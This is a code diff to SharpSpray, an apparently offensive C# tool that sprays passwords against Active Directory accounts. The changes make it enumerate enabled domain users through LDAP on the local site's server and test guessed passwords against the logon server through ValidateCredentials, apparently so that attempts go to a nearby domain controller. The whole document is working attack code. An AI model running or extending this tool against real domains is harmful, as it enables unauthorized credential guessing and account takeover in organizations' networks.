@@ -12,6 +12,13 @@ namespace SharpSpray
         static void Main(string[] args)
         {
 
+            string LogonServer = Environment.GetEnvironmentVariable("LOGONSERVER").TrimStart('\\');
+            if (LogonServer == null)
+            {
+                Console.WriteLine("[-] Failed to retrieve the LOGONSERVER the environment variable; the script will exit.");
+                System.Environment.Exit(1);
+            }
+            
             List<string> UserList = new List<string>();
             int minPwdLength = new int();
             int lockoutThreshold = new int();
@@ -42,7 +49,7 @@ namespace SharpSpray
 
             try
             {
-                DirectoryEntry dEntry = new DirectoryEntry("LDAP://" + System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().PdcRoleOwner);
+                DirectoryEntry dEntry = new DirectoryEntry("LDAP://" + System.DirectoryServices.ActiveDirectory.ActiveDirectorySite.GetComputerSite().Servers[0]);
                 DirectorySearcher dSearch = new DirectorySearcher(dEntry);
                 dSearch.Filter = "(&(objectCategory=Person)(sAMAccountName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
                 dSearch.PageSize = 1000;
@@ -141,7 +148,7 @@ namespace SharpSpray
                     bool Flag = false;
                     try
                     {
-                        using (PrincipalContext principalContext = new PrincipalContext(ContextType.Domain))
+                        using (PrincipalContext principalContext = new PrincipalContext(ContextType.Domain, LogonServer))
                         {
                             Flag = principalContext.ValidateCredentials(UserName, Password, ContextOptions.Negotiate);
                         }
